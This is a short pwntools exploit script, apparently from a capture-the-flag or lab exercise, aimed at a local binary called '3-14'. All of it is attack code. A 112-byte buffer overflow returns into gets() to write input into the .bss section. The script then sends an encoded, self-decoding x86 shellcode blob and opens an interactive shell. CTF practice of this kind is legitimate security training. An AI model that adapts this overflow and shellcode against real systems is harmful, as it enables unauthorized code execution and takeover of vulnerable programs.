from pwn import *
r=process("3-14")
elf=ELF("3-14")
bss=elf.bss()+0xf00;
shellcode="\xeb\x1b\x5f\x31\xc0\x6a\x53\x6a\x18\x59\x49\x5b\x8a\x04\x0f\xf6\xd3\x30\xd8\x88\x04\x0f\x50\x85\xc9\x75\xef\xeb\x05\xe8\xe0\xff\xff\xff\x1c\x7f\xc5\xf9\xbe\xa3\xe4\xff\xb8\xff\xb2\xf4\x1f\x95\x4e\xfe\x25\x97\x93\x30\xb6\x39\xb2\x2c"
gets=elf.symbols['gets']
offset=112
payload=offset*'A'+p32(gets)+p32(bss)+p32(bss)
r.sendline(payload)

r.sendline(shellcode)
#r.sendline("/bin/sh")
r.interactive();